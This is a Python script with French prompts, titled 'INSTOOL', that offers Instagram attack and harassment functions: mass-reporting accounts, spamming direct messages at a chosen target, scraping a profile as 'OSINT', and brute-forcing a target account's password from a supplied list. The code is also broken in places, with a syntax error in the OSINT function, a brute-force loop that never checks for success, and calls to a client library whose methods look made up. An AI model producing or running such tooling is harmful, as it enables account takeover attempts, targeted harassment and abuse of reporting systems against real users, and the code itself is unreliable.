import os
import instagram
import time
import logging
from colorama import init, Fore, Style
import requests
import json
import random
import string

init(autoreset=True)  # Initialize Colorama

# Configuration du logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Titre en ASCII
print("""
  _______  _______  _______  _______  _______  _______  _______  _______
 |       ||       ||       ||       ||       ||       ||       ||       |
 |  _____||_     _||   _   ||   _   ||   _   ||   _   ||   _   ||   _   |
 | |_____   |   |  |  | |  |  | |  |  | |  |  | | |  |  | |  |  | | |
 |_____  |  |   |  |  |_|  |  |_|  |  |_|  |  |_|  |  |_|  |  |_|  |
  _____| |  |   |  |       |       |       |       |       |       |
 |_______|  |___|  |_______|_______|_______|_______|_______|_______|
""")

print(f"{Fore.CYAN}INSTOOL{Style.RESET_ALL}")

class InstagramReporter:
    def __init__(self, access_token, client_secret):
        self.api = instagram.Client(access_token=access_token, client_secret=client_secret)

    def report_account(self, account_to_report, reason='spam'):
        try:
            self.api.report_account(account_to_report, reason=reason)
            logging.info(f"{Fore.GREEN}Account {account_to_report} reported successfully!{Style.RESET_ALL}")
        except instagram.exceptions.InstagramException as e:
            logging.error(f"{Fore.RED}Error reporting account {account_to_report}: {e}{Style.RESET_ALL}")

    def report_accounts(self, accounts_to_report, delay=60):
        for account in accounts_to_report:
            self.report_account(account)
            time.sleep(delay)  # Délai entre les rapports pour éviter les limitations de l'API

    def spam_direct_messages(self, account_to_spam, message, count=10):
        try:
            for i in range(count):
                self.api.direct_message(account_to_spam, message)
                logging.info(f"{Fore.YELLOW}Spamming direct message to {account_to_spam} ({i+1}/{count}){Style.RESET_ALL}")
                time.sleep(5)  # Délai entre les messages pour éviter les limitations de l'API
        except instagram.exceptions.InstagramException as e:
            logging.error(f"{Fore.RED}Error spamming direct message to {account_to_spam}: {e}{Style.RESET_ALL}")

    def block_account(self, account_to_block):
        try:
            self.api.block_account(account_to_block)
            logging.info(f"{Fore.GREEN}Account {account_to_block} blocked successfully!{Style.RESET_ALL}")
        except instagram.exceptions.InstagramException as e:
            logging.error(f"{Fore.RED}Error blocking account {account_to_block}: {e}{Style.RESET_ALL}")

    def unblock_account(self, account_to_unblock):
        try:
            self.api.unblock_account(account_to_unblock)
            logging.info(f"{Fore.GREEN}Account {account_to_unblock} unblocked successfully!{Style.RESET_ALL}")
        except instagram.exceptions.InstagramException as e:
            logging.error(f"{Fore.RED}Error unblocking account {account_to_unblock}: {e}{Style.RESET_ALL}")

    def get_account_info(self, account_to_get_info):
        try:
            info = self.api.get_account_info(account_to_get_info)
            logging.info(f"{Fore.CYAN}Account info for {account_to_get_info}: {info}{Style.RESET_ALL}")
        except instagram.exceptions.InstagramException as e:
            logging.error(f"{Fore.RED}Error getting account info for {account_to_get_info}: {e}{Style.RESET_ALL}")

    def osint(self, account_to_osint):
        try:
            url = f"https://www.instagram.com/{account_to_osint}/"
            response = requests.get(url)
            if response.status_code == 200:
                logging.info(f"{Fore.CYAN}OSINT pour {account_to_osint} : {response.text}{Style.RESET_ALL}")
            else:
                logging.error(f"{Fore.RED}Error OSINT pour {account_to_osint} : {response.status_code}{Style.RESET_ALL}")
        except requests.exceptions.RequestException as e:
            logging.error(f"{Fore.RED}Error OSINT pour {account _to_osint} : {e}{Style.RESET_ALL}")

    def brute_force (self, account_to_brute_force, password_list):
        try:
            for password in password_list:
                self.api.login(account_to_brute_force, password)
                logging.info(f"{Fore.YELLOW}Trying password {password} for account {account_to_brute_force}{Style.RESET_ALL}")
                time.sleep(5)  # Délai entre les tentatives pour éviter les limitations de l'API
        except instagram.exceptions.InstagramException as e:
            logging.error(f"{Fore.RED}Error brute forcing account {account_to_brute_force}: {e}{Style.RESET_ALL}")

def main():
    print("1. Reporter un compte")
    print("2. Reporter plusieurs comptes")
    print("3. Envoyer des messages directs spam")
    print("4. Bloquer un compte")
    print("5. Débloquer un compte")
    print("6. Obtenir des informations sur un compte")
    print("7. OSINT")
    print("8. Brute forcing")
    print("9. Quitter")

    access_token = input("Entrez votre access token : ")
    client_secret = input("Entrez votre client secret : ")

    reporter = InstagramReporter(access_token, client_secret)

    choice = input("Entrez votre choix : ")

    if choice == "1":
        account_to_report = input("Entrez le nom du compte à reporter : ")
        reason = input("Entrez la raison du rapport : ")
        reporter.report_account(account_to_report, reason)
    elif choice == "2":
        accounts_to_report = input("Entrez les noms des comptes à reporter (séparés par des virgules) : ")
        accounts_to_report = accounts_to_report.split(",")
        reporter.report_accounts(accounts_to_report)
    elif choice == "3":
        account_to_spam = input("Entrez le nom du compte à spammer : ")
        message = input("Entrez le message à envoyer : ")
        count = int(input("Entrez le nombre de messages à envoyer : "))
        reporter.spam_direct_messages(account_to_spam, message, count)
    elif choice == "4":
        account_to_block = input("Entrez le nom du compte à bloquer : ")
        reporter.block_account(account_to_block)
    elif choice == "5":
        account_to_unblock = input("Entrez le nom du compte à débloquer : ")
        reporter.unblock_account(account_to_unblock)
    elif choice == "6":
        account_to_get_info = input("Entrez le nom du compte pour obtenir des informations : ")
        reporter.get_account_info(account_to_get_info)
    elif choice == "7":
        account_to_osint = input("Entrez le nom du compte pour OSINT : ")
        reporter.osint(account_to_osint)
    elif choice == "8":
        account_to_brute_force = input("Entrez le nom du compte pour brute forcing : ")
        password_list = input("Entrez la liste des mots de passe à essayer (séparés par des virgules) : ")
        password_list = password_list.split(",")
        reporter.brute_force(account_to_brute_force, password_list)
    elif choice == "9":
        print("Au revoir !")
    else:
        print("Choix invalide. Veuillez réessayer.")

if __name__ == "__main__":
    main()
